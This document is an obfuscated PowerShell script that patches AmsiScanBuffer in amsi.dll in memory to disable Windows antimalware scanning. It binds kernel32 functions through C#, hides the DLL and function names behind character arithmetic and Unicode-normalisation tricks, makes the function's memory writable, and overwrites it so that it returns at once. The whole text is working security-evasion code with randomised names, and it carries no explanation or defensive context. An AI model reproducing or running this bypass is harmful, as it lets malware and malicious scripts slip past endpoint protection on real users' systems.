$jdqxr9ooW = @"
using System;
using System.Runtime.InteropServices;
public class jdqxr9ooW {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr QdfCmsk, string tTAV4TlA4hiV);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr toM33, UIntPtr HcQGs, uint owaqKbgf, out uint ICq9gMa9al6wQ_5Yft0);
}
"@

Add-Type $jdqxr9ooW

$c3T0J4IO7QuSVEU5 = [jdqxr9ooW]::LoadLibrary("$([cHaR](97+14-14)+[cHAR](109)+[cHaR]([BYtE]0x73)+[CHAr](90+15)+[CHAR]([bytE]0x2e)+[CHaR](100*38/38)+[CHaR]([BYtE]0x6c)+[CHaR](108*104/104))")
$NUxH8qVZbmFahIZrb_ = [jdqxr9ooW]::GetProcAddress($c3T0J4IO7QuSVEU5, "$(('ÃmsîScânBûff'+'êr').nOrMaLizE([Char](70*15/15)+[ChAr]([bYte]0x6f)+[cHaR](114+1-1)+[cHAR](109+81-81)+[cHaR]([BYtE]0x44)) -replace [CHAR](92+85-85)+[chaR]([BYTe]0x70)+[cHaR](123+21-21)+[cHAr]([Byte]0x4d)+[ChAR](74+36)+[ChaR]([byte]0x7d))")
$p = 0
[jdqxr9ooW]::VirtualProtect($NUxH8qVZbmFahIZrb_, [uint32]5, 0x40, [ref]$p)
$bOsA2PqkNNTJeokL_I64 = "0xB8"
$GTy = "0x57"
$Odrc2njnT = "0x00"
$Ngsv7eN = "0x07"
$tgeRxvIiaR9LZnq8lb = "0x80"
$wzAL = "0xC3"
$RnCXhDqMDC9WEaBwK = [Byte[]] ($bOsA2PqkNNTJeokL_I64,$GTy,$Odrc2njnT,$Ngsv7eN,+$tgeRxvIiaR9LZnq8lb,+$wzAL)
[System.Runtime.InteropServices.Marshal]::Copy($RnCXhDqMDC9WEaBwK, 0, $NUxH8qVZbmFahIZrb_, 6)